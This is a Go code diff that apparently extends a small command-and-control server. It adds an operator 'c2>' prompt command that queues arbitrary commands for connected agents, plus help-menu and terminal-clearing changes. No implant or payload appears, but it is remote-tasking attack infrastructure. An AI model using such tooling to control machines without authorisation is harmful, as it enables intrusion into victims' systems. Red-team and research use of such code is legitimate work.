@@ -7,6 +7,9 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
+	"runtime"
+	"strings"
 	"sync"
 )
 
@@ -53,7 +56,6 @@ func taskHandler(w http.ResponseWriter, r *http.Request) {
 
 	tasks[req.ID] = append(tasks[req.ID], req.Command)
 	json.NewEncoder(w).Encode(map[string]string{"status": "task queued"})
-	fmt.Println(tasks)
 }
 
 func answerHandler(w http.ResponseWriter, r *http.Request) {
@@ -98,6 +100,17 @@ func sendTask(w http.ResponseWriter, b models.NewBeacon) {
 	json.NewEncoder(w).Encode(newTask)
 }
 
+func addTask() {
+	fmt.Print("id -> ")
+	var id string
+	fmt.Scanln(&id)
+	fmt.Print("command -> ")
+	var command string
+	fmt.Scanln(&command)
+	tasks[id] = append(tasks[id], command)
+	fmt.Println("Task added")
+}
+
 func printBanner() {
 	banner := `
    ______   ______  
@@ -110,27 +123,44 @@ func printBanner() {
 ---------------------------------
 `
 	fmt.Println(banner)
+}
+
+func printHelp() {
 	fmt.Println(" Available commands:")
 	fmt.Println("   help      - Show available commands")
 	fmt.Println("   agents    - List connected agents")
 	fmt.Println("   tasks     - Show queued tasks")
+	fmt.Println("   add     - Add task to agent")
 	fmt.Println("   exit      - Stop server")
 	fmt.Println("---------------------------------")
 }
 
+func flushTerminal() {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "cls")
+	} else {
+		cmd = exec.Command("clear")
+	}
+
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	_ = cmd.Run()
+}
+
 func cli() {
 	wg.Wait()
+	printBanner()
+	printHelp()
 	for {
 		fmt.Print("c2> ")
 		var cmd string
 		fmt.Scanln(&cmd)
-
+		flushTerminal()
+		printBanner()
 		switch cmd {
 		case "help":
-			fmt.Println("help     - Show this message")
-			fmt.Println("agents   - List connected agents")
-			fmt.Println("tasks    - Show queued tasks")
-			fmt.Println("exit     - Quit server")
+			printHelp()
 		case "agents":
 			mu.Lock()
 			fmt.Println("Agents:")
@@ -142,8 +172,12 @@ func cli() {
 			mu.Lock()
 			fmt.Println("Queued tasks:")
 			for id, tlist := range tasks {
-				fmt.Printf("Agent %s -> %v\n", id, tlist)
+				fmt.Printf("Agent %s -> %v\n", id, strings.Join(tlist, ","))
 			}
+			mu.Unlock()
+		case "add":
+			mu.Lock()
+			addTask()
 			mu.Unlock()
 		case "exit":
 			fmt.Println("Shutting down...")
@@ -167,7 +201,6 @@ func runServer() {
 }
 
 func main() {
-	printBanner()
 	go cli()
 	runServer()
 }
